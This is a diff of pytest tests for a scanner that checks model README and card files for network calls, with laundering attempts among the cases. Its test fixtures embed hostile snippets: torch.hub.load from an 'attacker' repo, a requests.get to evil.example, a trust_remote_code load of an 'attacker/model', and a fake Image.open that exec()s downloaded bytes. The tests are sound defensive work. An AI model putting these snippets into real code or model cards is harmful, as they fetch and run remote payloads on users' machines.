+            "~~~python\nimport torch\ntorch.hub.load('attacker/repo', 'payload')\n~~~\n",
+            id="tilde-fenced-hub-load",
+        ),
+        pytest.param(
+            "> ```python\n> import torch\n> torch.hub.load('attacker/repo', 'payload')\n> ```\n",
+            id="blockquote-hub-load",
+        ),
+        pytest.param(
+            "<pre><code>\nimport torch\ntorch.hub.load('attacker/repo', 'payload')\n</code></pre>\n",
+            id="html-wrapped-hub-load",
+        ),
+        pytest.param(
+            "```python\nimport requests\nrequests.get('https://evil.example/payload')\n```\n",
+            id="unrelated-requests-network-call",
+        ),
+    ],
+)
+@pytest.mark.parametrize("prepend", [False, True], ids=["appended", "prepended"])
+@pytest.mark.parametrize("crlf", [False, True], ids=["lf", "crlf"])
+@pytest.mark.parametrize(
+    ("whitelist_value", "_whitelist_enabled"),
+    HUGGINGFACE_WHITELIST_POLICY_MODES,
+    ids=["default", "true", "false", "string-false", "string-zero", "string-off"],
+)
+def test_text_scanner_documentation_image_example_shelters_no_appended_content(
+    tmp_path: Path,
+    attack: str,
+    prepend: bool,
+    crlf: bool,
+    whitelist_value: bool | str | None,
+    _whitelist_enabled: bool,
+) -> None:
+    """Recognising the documented example must never remove a finding the payload alone produces.
+
+    The suppression is scoped to the proven fence, so concatenating other content can only ever
+    add findings. This is the invariant that matters: an attacker cannot launder unrelated
+    content by pasting the documented snippet next to it.
+
+    Note this asserts *no sheltering*, not that every attack below is detected. Several of these
+    payloads produce no TextScanner finding on their own, which this test deliberately does not
+    paper over - see the standalone-detection assertion.
+    """
+    trusted_payload = _documentation_image_example_payload(crlf=crlf)
+    attack_payload = attack.replace("\n", "\r\n").encode() if crlf else attack.encode()
+    payload = attack_payload + trusted_payload if prepend else trusted_payload + attack_payload
+    config: dict[str, Any] = {} if whitelist_value is None else {"use_hf_whitelist": whitelist_value}
+
+    attack_only_path = tmp_path / "attack_only" / "README.md"
+    attack_only_path.parent.mkdir()
+    attack_only_path.write_bytes(attack_payload)
+    attack_only = TextScanner(config).scan(str(attack_only_path))
+
+    combined_path = tmp_path / "combined" / "README.md"
+    combined_path.parent.mkdir()
+    combined_path.write_bytes(payload)
+    combined = TextScanner(config).scan(str(combined_path))
+    aggregate = scan_model_directory_or_file(str(combined_path), cache_enabled=False, **config)
+
+    def actionable(result: Any) -> set[tuple[Any, Any]]:
+        return {
+            (check.details.get("type"), check.details.get("function"))
+            for check in _failed_network_detection_checks(result)
+            if check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        }
+
+    assert hashlib.sha256(payload).digest() != hashlib.sha256(trusted_payload).digest()
+    assert actionable(attack_only) <= actionable(combined)
+    if actionable(attack_only):
+        assert combined.success is False
+        assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize("crlf", [False, True], ids=["lf", "crlf"])
+@pytest.mark.parametrize("rename", [b"out = Image.open", b"xmg = Image.open"])
+def test_text_scanner_documentation_image_example_survives_cosmetic_rewrites(
+    tmp_path: Path,
+    crlf: bool,
+    rename: bytes,
+) -> None:
+    """Renaming the bound variable is not an attack.
+
+    Recognition is structural, so a card that differs from any previously observed card only by
+    a local variable name stays informational instead of alerting on a benign example.
+    """
+    trusted_payload = _documentation_image_example_payload(crlf=crlf)
+    payload = trusted_payload.replace(b"img = Image.open", rename, 1)
+    text_path = tmp_path / "README.md"
+    text_path.write_bytes(payload)
+
+    result = TextScanner().scan(str(text_path))
+    network_checks = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection"
+        and (check.details.get("function") == "urlopen" or check.details.get("library") == "urllib")
+    ]
+
+    assert len(payload) == len(trusted_payload)
+    assert hashlib.sha256(payload).digest() != hashlib.sha256(trusted_payload).digest()
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert result.success is True
+
+
+@pytest.mark.parametrize("filename", ["README", "README.rst", "README.txt", "model_card.rst", "vocab.txt"])
+@pytest.mark.parametrize("crlf", [False, True], ids=["lf", "crlf"])
+def test_text_scanner_documentation_image_example_does_not_weaken_non_markdown_files(
+    tmp_path: Path,
+    filename: str,
+    crlf: bool,
+) -> None:
+    payload = _documentation_image_example_payload(crlf=crlf)
+    text_path = tmp_path / filename
+    text_path.write_bytes(payload)
+
+    result = TextScanner().scan(str(text_path))
+
+    assert result.success is False
+    assert any(
+        check.details.get("function") == "urlopen" and check.severity == IssueSeverity.CRITICAL
+        for check in _failed_network_detection_checks(result)
+    )
 
 
 def test_text_scanner_handles_routable_vocabulary_file(tmp_path: Path) -> None:
@@ -417,6 +1385,89 @@ def test_text_scanner_documentation_urls_are_informational(tmp_path: Path) -> No
     assert network_issues
     assert all(issue.severity == IssueSeverity.INFO for issue in network_issues)
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+@pytest.mark.parametrize("filename", ["README.md", "README", "README.en.md", "README.markdown"])
+def test_text_scanner_readme_official_sample_image_request_is_informational(tmp_path: Path, filename: str) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text(
+        "# Example\n```python\nimport requests\n"
+        "image_url = 'https://huggingface.co/spaces/org/demo/resolve/main/image.png'\n"
+        "image = Image.open(requests.get(image_url, stream=True).raw)\n```\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert result.success is True
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert not any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") in {"network_function", "network_library"}
+        for check in result.checks
+    )
+
+
+@pytest.mark.parametrize("filename", ["README.env", "readme.env", "README.ENV", "README.md.env"])
+def test_text_scanner_readme_environment_files_preserve_network_findings(tmp_path: Path, filename: str) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text(
+        "```python\nimport requests\n"
+        "image_url = 'https://huggingface.co/spaces/org/demo/resolve/main/image.png'\n"
+        "image = Image.open(requests.get(image_url, stream=True).raw)\n```\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert result.success is False
+    failed_network_checks = {
+        check.details.get("type")
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
+    }
+    assert {"network_library", "network_function"} <= failed_network_checks
+
+
+def test_text_scanner_readme_plain_http_sample_image_stays_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "```python\nimport requests\n"
+        "image_url = 'http://huggingface.co/spaces/org/demo/resolve/main/image.png'\n"
+        "requests.get(image_url, stream=True)\n```\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert result.success is False
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("type") == "network_function"
+        for check in result.checks
+    )
+
+
+def test_text_scanner_readme_remote_code_trust_stays_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "```python\nimport requests\nfrom transformers import AutoModel\n"
+        "image_url = 'https://huggingface.co/spaces/org/demo/resolve/main/image.png'\n"
+        "AutoModel.from_pretrained('attacker/model', trust_remote_code=1)\n"
+        "requests.get(image_url, stream=True)\n```\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert result.success is False
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("type") == "network_function"
+        for check in result.checks
+    )
 
 
 @pytest.mark.parametrize(
@@ -5095,3 +6146,63 @@ def test_text_metadata_read_failure_bypasses_stale_clean_cache(
         assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == cached_entries
     finally:
         reset_cache_manager()
+
+
+@pytest.mark.parametrize(
+    ("label", "example"),
+    [
+        pytest.param(
+            "local-image-class",
+            "```python\nfrom urllib.request import urlopen\nclass Image:\n    @staticmethod\n"
+            "    def open(response):\n        exec(response.read())\n"
+            "img = Image.open(urlopen(\n"
+            "    'https://huggingface.co/attacker/backdoor/resolve/main/logo.png'\n))\n```\n",
+            id="fence-defines-its-own-image",
+        ),
+        pytest.param(
+            "non-pil-image",
+            "```python\nfrom urllib.request import urlopen\nfrom evil import Image\n"
+            "img = Image.open(urlopen(\n"
+            "    'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/"
+            "beignets-task-guide.png'\n))\n```\n",
+            id="image-imported-from-elsewhere",
+        ),
+        pytest.param(
+            "no-image-import",
+            "```python\nfrom urllib.request import urlopen\n"
+            "img = Image.open(urlopen(\n"
+            "    'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/"
+            "beignets-task-guide.png'\n))\n```\n",
+            id="image-never-imported",
+        ),
+        pytest.param(
+            "getattr-primitive",
+            "```python\nfrom urllib.request import urlopen\nfrom PIL import Image\nimport timm\n"
+            "fetch = getattr(timm, 'create_model')\n"
+            "img = Image.open(urlopen(\n"
+            "    'https://huggingface.co/datasets/huggingface/documentation-images/resolve/main/"
+            "beignets-task-guide.png'\n))\n```\n",
+            id="execution-primitive-in-fence",
+        ),
+    ],
+)
+def test_text_scanner_documentation_image_example_requires_expected_pil_shape(
+    tmp_path: Path,
+    label: str,
+    example: str,
+) -> None:
+    """Recognition requires the expected PIL import and Image.open call shape.
+
+    Without these syntactic constraints, a card can define its own Image class whose open
+    executes downloaded bytes and still be treated as the documented example.
+    """
+    path = tmp_path / "README.md"
+    path.write_text(example, encoding="utf-8")
+
+    result = TextScanner().scan(str(path))
+
+    assert result.success is False, label
+    assert any(
+        check.details.get("function") == "urlopen" and check.severity == IssueSeverity.CRITICAL
+        for check in _failed_network_detection_checks(result)
+    ), label
